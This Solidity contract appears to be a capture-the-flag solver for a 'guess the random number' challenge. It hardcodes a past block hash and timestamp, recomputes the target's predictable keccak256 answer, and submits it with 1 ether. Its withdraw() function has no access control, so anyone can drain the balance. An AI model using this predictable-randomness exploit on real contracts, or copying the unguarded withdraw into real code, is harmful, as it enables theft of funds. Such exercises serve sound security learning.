// SPDX-License-Identifier: No License
pragma solidity ^0.8.0;
interface IGuessTheRandomNumberChallenge {
  function guess(uint8) external payable;
}
contract GuessTheRandomNumberSolver {
  IGuessTheRandomNumberChallenge public _interface;
  bytes32 public previousBlockHash = 0x66bcdb5e320c9e0c04a9fdeaa15de33a4c8a040db342f4f955fa54f170dba9ce;
  uint public previousTimestamp = 1641520092;
  constructor(address _interfaceAddress) {
    require(_interfaceAddress != address(0), "Address can not be Zero");
    _interface = IGuessTheRandomNumberChallenge(_interfaceAddress);
  }
  function solve() public payable {
    uint8 answer = uint8(uint256(keccak256(abi.encodePacked(previousBlockHash, previousTimestamp))));
    _interface.guess{value: 1 ether}(answer);
  }
  function getBalance() public view returns(uint){
    return address(this).balance;
  }
  function withdraw() public {
    payable(msg.sender).transfer(address(this).balance);
  }
  receive() external payable {}
}